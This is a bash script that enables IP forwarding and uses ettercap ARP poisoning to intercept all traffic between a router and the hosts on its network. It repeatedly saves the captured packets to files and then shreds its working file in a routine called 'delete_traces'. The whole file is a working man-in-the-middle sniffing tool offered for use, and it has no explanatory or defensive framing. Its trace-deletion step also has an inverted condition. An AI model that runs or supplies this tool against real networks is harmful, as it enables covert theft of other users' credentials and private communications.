#!/bin/bash

## Global Variables ##
interface=""
tmp_file="";
store_folder=$HOME;  # store packet on home folder
interval=900;
maximum=10


function error {
    echo -e "\033[091mERROR\033[0m: $1";
    return 0;
}


function log {
    echo -e "\033[092mINFO\033[0m: $1";
    return 0;
}


function ip_forward
{
    echo $1 > /proc/sys/net/ipv4/ip_forward;
    if [[ $? == 0 ]]; then
        log "IP forward was set to $1.";
    else
        error "IP forward has not been changed.";
        exit 1;
    fi

    return 0;
}


function check_root {
    uid=$(id -u);
    if [[ $uid != 0 ]]; then
        error "Only root can change kernel settings and capture traffic.";
        exit 1;
    fi
    return 0;
}

function generate_tmp_file {
    log "Grabbing router MAC address to generate host file ..."
    if [[ $1 == "" ]]; then
        error "No router IP argument";
        ip_forward 0;
        exit 1;
    fi

    router_ip=$1;
    router_mac=$(arp -a | grep $router_ip | awk {'print $4'});
    if [[ $router_mac == "" ]]; then
        error "No router MAC.";
        ip_forward 0;
        exit 1;
    fi
    log "Router MAC is $router_mac";

    tmp_file=$(mktemp);
    log "Temporary file generated at $tmp_file"
    echo "$router_ip $router_mac -" > $tmp_file;

    log "Host file generated.";
    return 0;
}


function delete_traces {
    if [[ $tmp_file == "" ]]; then
        shred -uz $tmp_file;
        if [[ $? == 0 ]]; then
            log "Temporary file deleted.";
        else
            error "Temporary file could not be deleted.";
        fi
    fi
}

function intercept {
    log "Commencing interception ...";
    i=0;
    while [[ $i < $maximum ]]; do
        time_stamp=$(date | sed 's/ /_/g' | sed 's/:/-/g' | sed 's/BRT//g' | sed 's/__/_/g');
        ettercap -Tqi $interface -M arp:remote /$router_ip// /// -s 's(300)qq' -P autoadd -j $tmp_file -w $store_folder/sniffing_$time_stamp.cap;
    if [[ $? == 0 ]]; then
        log "Interception has finished successfully.";
        sleep $interval;
    else
        error "Interception has run through errors.";
    fi
    done
    return 0;
}


# Check args
if [[ $# < 4 ]]; then
    error "Uso: $0 -i INTERFACE -r ROUTER_IP";
    exit 1;
fi


while getopts "i:r:" opt; do
    case $opt in
        i)interface=$OPTARG; log "Interface set to: $OPTARG";;
        r)router_ip=$OPTARG; log "Router IP set to: $OPTARG";;
        ?)error "Invalid argument"; exit 0;;
    esac
done


check_root;
ip_forward 1
generate_tmp_file $router_ip;


intercept;

ip_forward 0
delete_traces;
